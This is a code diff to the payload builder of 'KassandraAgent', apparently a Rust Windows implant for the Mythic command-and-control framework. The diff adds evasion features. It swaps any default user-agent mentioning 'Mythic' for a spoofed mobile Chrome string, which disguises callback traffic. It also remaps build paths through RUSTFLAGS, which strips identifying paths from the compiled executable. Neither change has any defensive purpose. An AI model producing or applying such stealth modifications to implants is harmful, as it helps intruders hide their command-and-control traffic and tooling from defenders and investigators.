@@ -1,4 +1,5 @@
 import pathlib
+import os
 from mythic_container.PayloadBuilder import *
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
@@ -261,7 +262,10 @@ class KassandraAgent(PayloadType):
             content = content.replace("%HOSTNAME%", Config.get("callback_host", ""))
             content = content.replace("%ENDPOINT%", Config.get("post_uri", ""))
             content = content.replace("%PORT%", str(Config.get("callback_port", "80")))
-            content = content.replace("%USERAGENT%", Config.get("USER_AGENT", ""))
+            ua = Config.get("USER_AGENT", "")
+            if not ua or "Mythic" in ua:
+                ua = "Mozilla/5.0 (Linux; Android 17; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.7871.126 Mobile Safari/537.36"
+            content = content.replace("%USERAGENT%", ua)
             content = content.replace("%PROXYURL%", Config.get("proxy_host", ""))
             content = content.replace("%BUSYWORK_INTENSITY%", self.get_parameter("busywork_intensity"))
             content = content.replace("%CHUNKSIZE%", str(self.get_parameter("chunk_size")))
@@ -361,10 +365,16 @@ class KassandraAgent(PayloadType):
             build_command = f"cargo {toolchain} build --release {target} {manifest} {features_flag}"
             filename = f"{agent_build_path.name}/kassandra/target/x86_64-pc-windows-gnu/release/kassandra.exe"
 
+        build_env = {
+            **dict(os.environ),
+            "RUSTFLAGS": "--remap-path-prefix /Mythic/=/ --remap-path-prefix /root/.cargo/registry/src/=dep/",
+        }
+
         proc = await asyncio.create_subprocess_shell(
             build_command,
             stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
+            stderr=asyncio.subprocess.PIPE,
+            env=build_env,
         )
         stdout, stderr = await proc.communicate()
         stdout_str = stdout.decode(errors="replace")
